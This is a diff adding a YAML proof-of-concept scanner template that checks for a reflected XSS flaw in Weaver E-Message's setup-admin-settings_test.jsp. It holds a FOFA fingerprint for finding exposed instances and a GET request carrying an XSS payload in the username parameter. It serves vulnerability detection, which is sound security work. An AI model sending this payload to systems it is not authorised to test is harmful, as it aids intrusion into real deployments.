@@ -1,0 +1,15 @@
+id: poc-yaml-e-message-setup-admin-settings-xss
+info:
+  name: 泛微E-Message setup-admin-settings_test.jsp反射性XSS漏洞
+  severity: medium
+  tags:
+  - xss
+  finger: e-message
+  fofa: title="emessage 管理界面"
+requests:
+- method: GET
+  path: /setup/setup-admin-settings_test.jsp?username=<input%20onfocus=prompt(1)%20autofocus>&ldap=true
+  expression: "status_code == 200 && \ncontains(urlencode(body),\"%3Ctd%3E%0A++++++++++++++++++++++++%3Cinput+onfocus%3Dprompt%281%29+autofocus%3E%0A++++++++++++++++++++++++%3C%2Ftd%3E%0A\"\
+    )\n"
+variables: {}
+transport: http
